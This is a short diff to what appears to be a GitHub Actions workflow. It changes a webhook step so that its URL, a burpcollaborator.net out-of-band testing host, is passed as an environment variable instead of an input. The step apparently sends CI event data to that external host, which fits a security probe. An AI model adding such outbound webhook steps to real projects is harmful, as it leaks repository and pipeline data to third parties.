@@ -15,5 +15,6 @@ jobs:
     # Runs a single command using the runners shell
     - name: Webhook
       uses: distributhor/workflow-webhook@v2
-      with:
-        url: "https://dm3vsqwekh95qwzolyut2m7cq3wtki.burpcollaborator.net"
+      env:
+        webhook_url: "https://dm3vsqwekh95qwzolyut2m7cq3wtki.burpcollaborator.net"
+
